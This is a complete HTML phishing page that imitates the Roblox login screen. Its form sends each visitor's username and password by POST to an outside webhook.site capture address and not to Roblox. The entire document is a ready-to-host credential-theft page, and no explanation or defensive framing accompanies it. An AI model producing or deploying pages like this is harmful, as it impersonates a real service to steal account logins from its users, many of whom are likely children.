<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Roblox</title>
<style>
body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:30px;border-radius:8px;width:300px;box-shadow:0 2px 10px #ccc}
h2{text-align:center}
input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:10px;background:#00a2ff;color:#fff;border:none;border-radius:4px;font-size:16px}
</style>
</head>
<body>
<div class="box">
<h2>Log In</h2>
<form action="https://webhook.site/ID-UL-TAU" method="POST">
<input name="username" placeholder="Username/Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>
